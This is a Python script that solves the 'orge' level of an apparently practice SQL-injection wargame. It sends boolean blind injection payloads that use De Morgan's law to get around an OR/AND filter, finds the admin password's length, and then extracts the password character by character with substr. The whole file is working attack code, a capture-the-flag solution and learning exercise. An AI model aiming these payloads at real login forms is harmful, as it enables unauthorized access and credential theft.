import requests
from dotenv import load_dotenv
import os

load_dotenv()

candidate = ['0','1','2','3','4','5','6','7','8','9',
             'a','b','c','d','e','f',
             'g','h','i','j','k','l','m',
             'n','o','p','q','r','s','t',
             'u','v','w','x','y','z',
             'A','B','C','D','E','F',
             'G','H','I','J','K','L','M',
             'N','O','P','Q','R','S','T',
             'U','V','W','X','Y','Z',
             '!', '@', '#', '$', '%', '^', '&', '*']
pLength = 0
for i in range(1,100):
    #드모르간의 법칙 활용
    url=os.environ.get('LOS_URL')+'chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=1234%27||!(id!=%27admin%27||length(pw)!='+str(i)+')%23'

    headers = {
        'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
    }

    res=requests.get(url, headers=headers)
    if 'Hello admin' in res.text:
        print('length is '+str(i))
        pLength = i
        break
    else:
        print('length is not '+str(i))
headers = {
    'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
}

answer = ''
for i in range(0,pLength):
    for j in candidate:
        
        url=os.environ.get('LOS_URL')+'chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=1234%27||!(id!=%27admin%27||substr(pw,'+str(i+1)+',1)!=%27'+j+'%27)%23'
        headers = {
            'COOKIE': 'PHPSESSID='+os.environ.get('LOS_COOKIE')
        }
        print(url)
        res=requests.get(url, headers=headers)
        if 'Hello admin' in res.text[:200]:
            answer += j
            break
        else:
            print(j+' is not the answer')
    print(answer)

print(answer)
#쉽고 재밌는 문제였당ㅎ